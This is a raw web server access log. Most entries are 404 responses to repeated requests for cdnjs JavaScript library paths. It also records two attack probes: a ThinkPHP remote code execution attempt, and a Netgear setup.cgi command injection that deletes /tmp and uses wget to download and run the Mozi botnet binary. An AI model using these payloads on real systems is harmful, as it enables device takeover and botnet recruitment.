83.97.73.89 - - [06/Jul/2023:08:49:44 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
120.85.115.69 - - [06/Jul/2023:12:40:57 +0900] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 12981 "-" "-"
34.239.148.27 - - [06/Jul/2023:13:09:04 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.143 Safari/537.36"
34.239.148.27 - - [06/Jul/2023:13:09:04 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20120422 Firefox/12.0 SeaMonkey/2.9"
34.239.148.27 - - [06/Jul/2023:13:09:04 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36"
34.239.148.27 - - [06/Jul/2023:13:09:04 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.26 Safari/537.36"
34.239.148.27 - - [06/Jul/2023:13:09:04 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941"
34.239.148.27 - - [06/Jul/2023:13:09:05 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (OS/2; U; OS/2; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Arora/0.11.0 Safari/533.3"
34.239.148.27 - - [06/Jul/2023:13:09:05 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js HTTP/1.1" 404 4611 "-" "HTMLParser/1.6"
34.239.148.27 - - [06/Jul/2023:13:09:05 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 OPT/3.2.13"
34.239.148.27 - - [06/Jul/2023:13:09:06 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js HTTP/1.1" 404 4611 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12; Microsoft ZuneHD 4.3)"
34.239.148.27 - - [06/Jul/2023:13:09:07 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js HTTP/1.1" 404 4611 "-" "CSSCheck/1.2.2"
34.239.148.27 - - [06/Jul/2023:13:10:06 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 AtContent/96.5.9594.95"
34.239.148.27 - - [06/Jul/2023:13:10:06 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:24.0) Gecko/20100101 Firefox/24.0 SeaMonkey/2.21"
34.239.148.27 - - [06/Jul/2023:13:10:06 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/lazysizes/5.1.2/lazysizes.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330"
34.239.148.27 - - [06/Jul/2023:13:10:06 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Galaxy S II Build/GRJ22) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
34.239.148.27 - - [06/Jul/2023:13:10:06 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js HTTP/1.1" 404 4611 "-" "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0"
34.239.148.27 - - [06/Jul/2023:13:10:06 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; rv:45.9) Gecko/20100101 Goanna/3.2 Firefox/45.9 PaleMoon/27.4.0"
34.239.148.27 - - [06/Jul/2023:13:10:06 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 11; SM-T500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Safari/537.36"
34.239.148.27 - - [06/Jul/2023:13:10:06 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.30"
34.239.148.27 - - [06/Jul/2023:13:10:07 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/4.8 [en] (X11; U; SunOS; 5.7 sun4u)"
34.239.148.27 - - [06/Jul/2023:13:10:10 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2859.0 Safari/537.36"
34.239.148.27 - - [06/Jul/2023:13:11:07 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 10; MAR-LX1M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
34.239.148.27 - - [06/Jul/2023:13:11:07 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
34.239.148.27 - - [06/Jul/2023:13:11:07 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba"
34.239.148.27 - - [06/Jul/2023:13:11:07 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.239.148.27 - - [06/Jul/2023:13:11:07 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
34.239.148.27 - - [06/Jul/2023:13:11:07 +0900] "GET //cdnjs.cloudflare.com/ajax/libs/highlight.js HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1"
